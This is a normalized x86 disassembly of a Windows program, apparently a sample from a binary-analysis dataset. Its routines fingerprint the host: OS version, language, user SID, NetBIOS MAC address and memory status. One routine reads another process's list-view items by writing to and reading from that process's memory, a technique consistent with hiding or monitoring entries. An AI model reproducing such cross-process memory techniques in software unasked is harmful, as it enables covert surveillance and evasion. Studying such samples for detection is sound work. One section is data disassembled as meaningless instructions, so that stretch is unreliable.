call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
xor ecx ecx
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx esi
mov edx r-xdata
mov eax ebx
call sub_422068
mov eax ebx
call sub_404650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_48d3c4
push ebp
mov ebp esp
add esp 0xffffff60
push ebx
push esi
xor edx edx
mov [ ebp - 0xa0 ] edx
mov [ ebp - 0x9c ] edx
mov [ ebp - 0x98 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_48d59b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx r-xdata
call sub_405584
mov [ ebp - 0x94 ] 0x94
lea eax [ ebp - 0x94 ]
push eax
call GetVersionExA
mov eax [ ebp - 0x84 ]
dec eax
je r-xdata
mov eax [ ebp - 0x8c ]
sub eax 0x1
jb r-xdata
dec eax
jne r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
sub eax 0x9
je r-xdata
lea eax [ ebp - 0x98 ]
lea edx [ ebp - 0x80 ]
mov ecx 0x80
call sub_4057a0
cmp [ ebp - 0x98 ] 0x0
je r-xdata
mov eax [ ebp - 0x90 ]
sub eax 0x4
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
sub eax 0x50
je r-xdata
mov esi [ ebp - 0x88 ]
test esi esi
je r-xdata
push [ ebx ]
push r-xdata
lea eax [ ebp - 0x9c ]
lea edx [ ebp - 0x80 ]
mov ecx 0x80
call sub_4057a0
push [ ebp - 0x9c ]
mov eax ebx
mov edx 0x3
call sub_4058e0
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
dec eax
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48d5a2
lea eax [ ebp - 0xa0 ]
mov edx 0x3
call sub_405554
retn
push [ ebx ]
push r-xdata
mov eax esi
xor edx edx
push edx
push eax
lea eax [ ebp - 0xa0 ]
call sub_409e5c
push [ ebp - 0xa0 ]
push r-xdata
mov eax ebx
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0x8c ]
sub eax 0x1
jb r-xdata
dec eax
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x8c ]
sub eax 0x1
jb r-xdata
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
dec eax
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
jmp r-xdata
sub_48d6a4
push ebx
add esp 0xffffff98
mov ebx eax
call GetUserDefaultLangID
push 0x64
lea edx [ esp + 0x4 ]
push edx
movzx eax ax
push eax
call VerLanguageNameA
mov eax ebx
mov edx esp
mov ecx 0x65
call sub_4057a0
add esp 0x68
pop ebx
retn
sub_48d6d4
push ebx
push esi
mov esi eax
mov eax 0x90
call sub_402f00
mov ebx eax
push 0x90
push ebx
call GetSystemDirectoryA
mov edx esi
mov eax ebx
call sub_40aaa8
mov eax ebx
call sub_402f1c
pop esi
pop ebx
retn
sub_48d704
push ebx
push esi
mov esi eax
mov eax 0x90
call sub_402f00
mov ebx eax
push 0x90
push ebx
call GetWindowsDirectoryA
mov edx esi
mov eax ebx
call sub_40aaa8
mov eax ebx
call sub_402f1c
pop esi
pop ebx
retn
sub_48d734
push ebx
push esi
push edi
push ebp
add esp 0xffffffb8
mov [ esp + 0x4 ] ecx
mov ebx edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] 0x1
mov eax [ esp ]
push eax
call IsValidSid
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
add esp 0x48
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
push eax
call GetSidIdentifierAuthority
mov edi eax
mov eax [ esp ]
push eax
call GetSidSubAuthorityCount
movzx ebp [ eax ]
mov eax ebp
add eax eax
add eax eax
lea eax [ eax + eax * 2 ]
add eax 0x1b
inc eax
mov esi eax
mov eax [ esp + 0x4 ]
cmp esi [ eax ]
jbe r-xdata
push 0x0
mov eax [ esp + 0x10 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x0
lea ecx [ esp + 0x14 ]
mov edx r-xdata
mov eax ebx
call sub_40af18
cmp [ edi ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
push 0x7a
call SetLastError
jmp r-xdata
push 0x5
mov eax ebx
call sub_40a868
add eax ebx
movzx edx [ edi ]
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] 0x0
movzx edx [ edi + 0x1 ]
mov [ esp + 0x24 ] edx
mov [ esp + 0x28 ] 0x0
movzx edx [ edi + 0x2 ]
mov [ esp + 0x2c ] edx
mov [ esp + 0x30 ] 0x0
movzx edx [ edi + 0x3 ]
mov [ esp + 0x34 ] edx
mov [ esp + 0x38 ] 0x0
movzx edx [ edi + 0x4 ]
mov [ esp + 0x3c ] edx
mov [ esp + 0x40 ] 0x0
movzx edx [ edi + 0x5 ]
mov [ esp + 0x44 ] edx
mov [ esp + 0x48 ] 0x0
lea ecx [ esp + 0x1c ]
mov edx r-xdata
call sub_40af18
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_40a868
mov esi eax
mov edi ebp
dec edi
test edi edi
jb r-xdata
push 0x0
mov eax ebx
call sub_40a868
add eax ebx
movzx edx [ edi + 0x5 ]
movzx ecx [ edi + 0x4 ]
shl ecx 0x8
add edx ecx
movzx ecx [ edi + 0x3 ]
shl ecx 0x10
add edx ecx
movzx ecx [ edi + 0x2 ]
shl ecx 0x18
add edx ecx
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] 0x0
lea ecx [ esp + 0x14 ]
mov edx r-xdata
call sub_40af18
mov [ esp + 0x8 ] 0xffffffff
inc edi
xor ebp ebp
push 0x0
push ebp
mov eax [ esp + 0x8 ]
push eax
call GetSidSubAuthority
mov eax [ eax ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x0
lea ecx [ esp + 0x14 ]
mov edx r-xdata
lea eax [ esi + ebx ]
call sub_40af18
mov eax ebx
call sub_40a868
mov esi eax
inc ebp
dec edi
jne r-xdata
sub_48d900
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
xor eax eax
mov [ esp + 0xc ] eax
xor esi esi
mov edi 0x1
xor ebx ebx
lea eax [ esp + 0xc ]
push eax
push esi
push ebx
push edi
mov eax [ esp + 0x10 ]
push eax
call GetTokenInformation
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ ebx ]
mov edx [ esp + 0x4 ]
call sub_48d734
test eax eax
je r-xdata
call GetLastError
cmp eax 0x7a
jne r-xdata
mov eax ebp
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
push ebx
push 0x0
call GetProcessHeap
push eax
call HeapFree
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
push eax
push 0x8
call GetProcessHeap
push eax
call HeapAlloc
mov ebx eax
test ebx ebx
je r-xdata
or ebp 0xffffffff
mov esi [ esp + 0xc ]
xor eax eax
mov [ esp + 0xc ] eax
lea eax [ esp + 0xc ]
push eax
push esi
push ebx
push edi
mov eax [ esp + 0x10 ]
push eax
call GetTokenInformation
test eax eax
je r-xdata
sub_48d9b0
push ebx
push esi
add esp 0xfffffef0
mov esi eax
mov eax esi
call sub_405530
push esp
push 0xffffffff
push 0x8
call GetCurrentThread
push eax
call OpenThreadToken
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
call GetLastError
cmp eax 0x3f0
jne r-xdata
add esp 0x110
pop esi
pop ebx
retn
lea eax [ esp + 0x8 ]
xor ecx ecx
mov edx 0x105
call sub_403af4
mov [ esp + 0x4 ] 0x105
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_48d900
test eax eax
je r-xdata
push esp
push 0x8
call GetCurrentProcess
push eax
call OpenProcessToken
mov ebx eax
mov eax [ esp ]
push eax
call CloseHandle
mov eax esi
lea edx [ esp + 0x8 ]
mov ecx 0x105
call sub_4057a0
sub_48da48
push ebp
mov ebp esp
add esp 0xfffffd1c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48dbd6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x48 ]
xor ecx ecx
mov edx 0x40
call sub_403af4
mov [ ebp - 0x48 ] 0x32
lea eax [ ebp - 0x48 ]
push eax
call Netbios
lea eax [ ebp - 0x48 ]
xor ecx ecx
mov edx 0x40
call sub_403af4
lea eax [ ebp - 0x3e ]
mov cl 0x20
mov edx 0x10
call sub_403af4
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_4059f0
lea edx [ ebp - 0x3e ]
mov ecx ebx
call sub_4030fc
mov [ ebp - 0x48 ] 0x33
mov [ ebp - 0x18 ] 0x0
mov ax 0x26a
mov [ ebp - 0x40 ] ax
movzx eax ax
call sub_402f00
mov ebx eax
test ebx ebx
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov [ ebp - 0x44 ] ebx
lea eax [ ebp - 0x48 ]
push eax
call Netbios
lea edx [ ebp - 0x2b2 ]
lea eax [ ebp - 0x44 ]
mov ecx 0x26a
call sub_4030fc
lea eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0x2b2 ]
mov [ ebp - 0x2e4 ] eax
mov [ ebp - 0x2e0 ] 0x0
movzx eax [ ebp - 0x2b1 ]
mov [ ebp - 0x2dc ] eax
mov [ ebp - 0x2d8 ] 0x0
movzx eax [ ebp - 0x2b0 ]
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x2d0 ] 0x0
movzx eax [ ebp - 0x2af ]
mov [ ebp - 0x2cc ] eax
mov [ ebp - 0x2c8 ] 0x0
movzx eax [ ebp - 0x2ae ]
mov [ ebp - 0x2c4 ] eax
mov [ ebp - 0x2c0 ] 0x0
movzx eax [ ebp - 0x2ad ]
mov [ ebp - 0x2bc ] eax
mov [ ebp - 0x2b8 ] 0x0
lea edx [ ebp - 0x2e4 ]
mov ecx 0x5
mov eax r-xdata
call sub_40af98
mov eax ebx
call sub_402f1c
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_405584
mov eax esi
mov edx r-xdata
call sub_405584
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48dbdd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_48dc30
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48dcc9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48dc97
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_48d6a4
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0xc ]
call sub_48ceec
push [ ebp - 0xc ]
push r-xdata
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx 0x5
call sub_4058e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48dcd0
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_405554
retn
sub_48dd0c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48ddad
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48dd80
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x24 ] 0x20
lea eax [ ebp - 0x24 ]
push eax
call GlobalMemoryStatus
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x30 ]
xor ecx ecx
mov eax r-xdata
call sub_40af98
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ddb4
lea eax [ ebp - 0x28 ]
call sub_405530
retn
sub_48dde0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48de71
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0xa
push ebx
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push 0x0
call FindResourceA
mov ebx eax
push ebx
push 0x0
call LoadResource
mov esi eax
push ebx
push 0x0
call SizeofResource
mov ebx eax
push esi
call LockResource
lea edx [ ebp - 0x8 ]
mov ecx ebx
xchg edx eax
call sub_405620
mov eax edi
mov edx [ ebp - 0x8 ]
call sub_405584
push esi
call FreeResource
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48de78
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_48deec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_48df3a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_48bf2c
mov edx [ ebp - 0x4 ]
lea eax [ esi + 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48df41
lea eax [ ebp - 0x4 ]
call sub_405530
retn
add esp 0xfffffff0
call sub_404974
sub_48df60
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48dfe1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48dde0
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_409b7c
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48dfe8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
mov edx [ rw-data ]
mov edx [ edx ]
lea eax [ ebp - 0x10 ]
mov ecx [ ebx + 0x4 ]
call sub_405864
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4616b4
sub_48dff0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push j_sub_404de4#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_405530
call GetForegroundWindow
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48e064
lea eax [ ebp - 0x4 ]
call sub_405530
retn
push ebx
call GetWindowTextLengthA
mov esi eax
inc esi
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_405c6c
push esi
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push ebx
call GetWindowTextA
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_409c20
sub_48e06c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48e273
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x24 ]
call sub_48dff0
mov eax [ ebp - 0x24 ]
call sub_4059dc
push eax
push r-xdata
call FindWindowA
mov [ ebp - 0x18 ] eax
push 0x0
push r-xdata
push 0x0
mov eax [ ebp - 0x18 ]
push eax
call FindWindowExA
mov [ ebp - 0x18 ] eax
push 0x0
push r-xdata
push 0x0
mov eax [ ebp - 0x18 ]
push eax
call FindWindowExA
mov [ ebp - 0x18 ] eax
push 0x0
push 0x0
push 0x1004
mov eax [ ebp - 0x18 ]
push eax
call SendMessageA
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48e27a
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_405554
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
push 0x1008
mov eax [ ebp - 0x18 ]
push eax
call SendMessageA
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x8 ]
call sub_409b7c
mov eax [ ebp - 0x30 ]
push eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0xc ]
call sub_409b7c
mov edx [ ebp - 0x34 ]
pop eax
call sub_405974
jne r-xdata
mov edi 0x12c
push 0x4
push 0x3000
push edi
push 0x0
call VirtualAlloc
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call __imp_GetWindowThreadProcessId
mov eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x38
call OpenProcess
mov esi eax
push 0x4
push 0x3000
push edi
push 0x0
push esi
call VirtualAllocEx
mov edi eax
mov [ ebx ] 0x1
xor eax eax
mov [ ebx + 0x4 ] eax
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax edi
add eax 0x28
mov [ ebx + 0x14 ] eax
mov [ ebx + 0x18 ] 0x64
lea eax [ ebp - 0x10 ]
push eax
push 0x400
push ebx
push edi
push esi
call WriteProcessMemory
push edi
mov eax [ ebp - 0x1c ]
push eax
push 0x102d
mov eax [ ebp - 0x18 ]
push eax
call SendMessageA
lea eax [ ebp - 0x10 ]
push eax
push 0x400
push ebx
push edi
push esi
call ReadProcessMemory
lea eax [ ebp - 0xc ]
mov edx ebx
add edx 0x28
call sub_405728
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_409b7c
mov eax [ ebp - 0x28 ]
push eax
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
call sub_409b7c
mov edx [ ebp - 0x2c ]
pop eax
call sub_405974
je r-xdata
push 0x8000
push 0x0
push ebx
call VirtualFree
push 0x8000
push 0x0
push edi
push esi
call VirtualFreeEx
push esi
call CloseHandle
inc [ ebp - 0x1c ]
dec [ ebp - 0x20 ]
jne r-xdata
sub_48e29a
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_48e322
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a68c
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx ebx
sub ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
sub ebx 0x4
mov ebx [ ebx ]
push 0x1f4
call Sleep
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_48e06c
jmp r-xdata
sub_48e340
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_48e392
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_485150
push 0x2710
call Sleep
jmp r-xdata
sub_48e3ac
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_404de4#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax rw-data
call sub_405530
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48e3dc
retn
sub_48e422
dec eax
add [ ebp + edi * 8 + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xf1
dec eax
add ah bh
pop es
inc ecx
add [ ecx + esi * 8 + 0x48 ] al
add [ ebx ] ch
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
int1
dec eax
add ah dh
insb
inc ecx
add al bh
int1
dec eax
add [ edx + edx ] bl
inc edx
add [ edx + esi * 8 + 0x151c0048 ] cl
inc edx
add [ edx + esi * 8 + 0x29240048 ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 - 0x46bfffb8 ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x600048f3 ] bl
int3
sub_48f000
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_402cdc
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
call sub_404418
test al al
je r-xdata
call sub_40450c
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_4013bc
mov [ rw-data ] eax
call GetACP
mov [ rw-data ] eax
call sub_4013a4
mov [ rw-data ] eax
call sub_404448
sub_48f0ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_48f11e
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48f125
retn
mov eax sub_40fac4
call sub_40521c
mov eax r-xdata
call sub_405244
cmp [ rw-data ] 0x0
je r-xdata
call sub_40e1f8
mov eax r-xdata
call sub_406eac
call sub_40e314
call sub_40f4ac
call sub_40ebcc
mov eax rw-data
mov edx r-xdata
call sub_405584
sub_48f144
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_404de4#5
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48f1ec
retn
mov eax rw-data
call sub_415ea4
mov eax sub_411350
mov [ rw-data ] eax
mov eax sub_410ef4
mov [ rw-data ] eax
mov edx sub_410e04
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_411650
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_415b98
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_411a68
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_414a44
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_415164
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_48f1f8
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_404de4#4
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48f288
retn
call sub_41f71c
mov eax sub_421054
call sub_406e9c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f670
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_407024
mov dl 0x1
mov eax [ r-xdata ]
call sub_41897c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419ab0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419ab0
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_48f29c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42b3d4
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_42b47c
mov cx 0x30
mov dl 0x1
mov eax [ r-xdata ]
call sub_4239bc
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_4239bc
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_4239bc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b658
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419ab0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419ab0
mov [ rw-data ] eax
mov ecx sub_424240
mov edx sub_424250
mov eax [ r-xdata ]
call sub_419260
mov ecx r-xdata
mov edx sub_424458
mov eax [ r-xdata ]
call sub_419260
sub_48f398
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42c22c
mov eax sub_42c898
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov [ eax ] sub_42cb08
mov eax r-xdata
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_42cbe4
sub_48f434
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_407688
xor edx edx
mov [ eax + 0x14 ] edx
call sub_407688
xor edx edx
mov [ eax + 0x18 ] edx
call sub_407688
xor edx edx
mov [ eax + 0x1c ] edx
call sub_407688
xor edx edx
mov [ eax + 0x20 ] edx
call sub_407688
xor edx edx
mov [ eax + 0x24 ] edx
call sub_407688
xor edx edx
mov [ eax + 0x28 ] edx
call sub_407688
xor edx edx
mov [ eax + 0x2c ] edx
call sub_407688
xor edx edx
mov [ eax + 0x30 ] edx
call sub_407688
xor edx edx
mov [ eax + 0x34 ] edx
xor eax eax
mov [ rw-data ] eax
sub_48f4ff
add [ ebx + 0x499bb42d ] al
add [ ecx ] al
jae r-xdata
retn
mov eax r-xdata
call sub_405244
call sub_431150
mov eax [ r-xdata ]
call sub_4190d4
mov eax [ r-xdata ]
call sub_419174
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419120
sub_48f5b0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4394a0
call sub_40521c
mov eax [ r-xdata ]
call sub_4190d4
mov eax [ r-xdata ]
call sub_419174
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419120
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419120
mov eax [ r-xdata ]
call sub_419018
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42cdc0
mov [ rw-data ] eax
sub_48f638
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_48f68f
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48f696
retn
mov eax sub_4482b4
call sub_405244
call sub_447d54
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_43bb78
call sub_41938c
xor eax eax
mov [ rw-data ] eax
sub_48f6d4
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_404de4#3
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48f761
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_45dae0
mov eax [ r-xdata ]
call sub_4190d4
mov eax [ r-xdata ]
call sub_419174
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419120
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419120
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419120
sub_48f780
sub [ rw-data ] 0x1
jae r-xdata
retn
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
push 0x0
push rw-data
push rw-data
call GdiplusStartup
_start
push ebp
mov ebp esp
mov ecx 0x30
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
